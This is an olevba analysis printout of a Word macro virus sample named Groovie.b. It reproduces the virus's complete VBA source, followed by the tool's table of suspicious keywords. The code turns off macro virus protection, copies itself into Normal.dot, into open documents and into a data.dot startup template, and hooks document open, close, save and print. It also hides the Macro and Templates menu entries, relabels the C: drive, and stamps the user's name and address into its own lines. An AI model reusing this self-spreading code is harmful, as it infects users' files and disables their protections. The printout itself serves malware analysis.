olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-9efa32b21b0a667d59b4c3847643ee83a815376b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-9efa32b21b0a667d59b4c3847643ee83a815376b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.b-9efa32b21b0a667d59b4c3847643ee83a815376b - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' IP20.12.1999 09:41:38376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Public I02 As Boolean
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Public I03 As Boolean
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Public I04 As Boolean
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Public I05 As Boolean
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Public I06 As String
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Public I07 As Boolean
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Public I08 As Boolean
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Function I09()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
On Error Resume Next
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If MacroContainer = NormalTemplate Then
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        I01 = "normal"
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        GoTo checkout
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    End If
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
checkout:
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Function
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Function I10()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
On Error Resume Next
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    Next i
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    Next i
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Function
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Function I11()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
On Error Resume Next
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Call I09
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Call I10
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If I01 = "document" Then Call I12
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If I01 = "normal" Then Call I13
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If I01 = "orbit" Then Call I14
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Function
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Function I12()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
On Error Resume Next
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If I03 = False And I05 = False Then
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        With NormalTemplate.VBProject
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        End With
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        End With
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    End If
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If I02 = False Then
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        Shell ("label c: groovie"), 0
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        Windows(1).Close
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    End If
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Function
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Function I13()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
On Error Resume Next
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Application.ScreenUpdating = False
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    Call I17
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If I04 = False And I07 = True Then
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        With ActiveDocument.VBProject
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        End With
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        End With
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        With Dialogs(wdDialogFileSummaryInfo)
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
            .Comments = "ALT-F11 says it's groovie!"
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
            .Execute
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        End With
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    End If
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If I02 = False And I07 = True Then
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    End If
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If I02 = False And I07 = False Then
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        Documents.Add Template:="", NewTemplate:=False
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    End If
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Application.ScreenUpdating = True
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Function
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Function I14()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
On Error Resume Next
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Application.ScreenUpdating = False
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        If I03 = False And I05 = False Then
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
            With NormalTemplate.VBProject
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
            End With
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
            End With
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
            NormalTemplate.Save
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        End If
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        If I04 = False Then
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
            With ActiveDocument.VBProject
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
            End With
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
            End With
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
            With Dialogs(wdDialogFileSummaryInfo)
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
                .Comments = "ALT-F11 says it's groovie!"
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
                .Execute
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
            End With
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        End If
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Application.ScreenUpdating = True
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Function
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Function I15()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
On Error Resume Next
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    Options.VirusProtection = False
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    Options.SaveNormalPrompt = False
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    Options.ConfirmConversions = False
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    I06 = ActiveDocument.FullName
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    Call I11
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Function
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Sub AutoOpen()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
On Error Resume Next
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Call I15
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Sub
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Sub AutoExit()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
On Error Resume Next
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Call I15
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Sub
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Sub FileSaveAs()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
On Error Resume Next
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Call I16
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Call I15
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Dialogs(wdDialogFileSaveAs).Show
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Sub
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Sub filesave()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
On Error Resume Next
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Call I16
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Call I15
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Sub
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Sub fileclose()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
On Error Resume Next
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
I08 = True
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Call I15
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
ActiveDocument.Close
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Sub
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Sub fileprint()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
On Error Resume Next
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Call I15
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Dialogs(wdDialogFilePrint).Show
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Sub
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Sub ViewVBCode()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Sub
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Sub ToolsMacro()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Sub
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Sub FileTemplates()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Sub
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Function I17()
 ' IP20.12.1999 09:41:39376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
On Error GoTo docek
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    If ActiveDocument.Name <> "" Then
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
        I07 = True
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    End If
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    GoTo over
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
docek:
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
    I07 = False
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
over:
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Function
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Function I16()
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Randomize
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
rn = Int(Rnd * 999)
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").codemodule
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
For x = 2 To 358 Step 2
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
.deletelines x
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
Next x
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End With
 ' IP20.12.1999 09:41:40376Iþýl Pakünlü376HP DeskJet 610C Series on LPT1:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

